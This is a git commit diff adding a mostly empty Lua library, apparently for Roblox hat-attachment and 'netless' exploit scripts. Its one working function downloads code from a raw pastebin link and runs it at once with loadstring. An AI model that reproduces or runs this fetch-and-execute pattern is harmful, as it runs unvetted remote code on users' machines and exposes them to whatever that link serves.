f708fb0150c91708be233053fc59153885029a28
dogi12 <88685766+dogi12@users.noreply.github.com>
2022-11-13 11:54:31 +0300

    Update lib.lua

--- lib.lua
+++ lib.lua
@@ -1,1 +1,22 @@
-print(1)
+local Library =  {}
+
+
+function Library:Attach(name,hat1,part1,orient,pos)
+    
+end
+
+function Library:DeAttach(name)
+    
+end
+
+function Library:ModifyAttachment(name,type,var)
+    
+end
+
+function Library:ModifyHat(hat,type,var)
+    
+end
+
+function Library:netless()
+    loadstring(game:HttpGet(('https://pastebin.com/raw/Cu7bKQWN'),true))()
+end
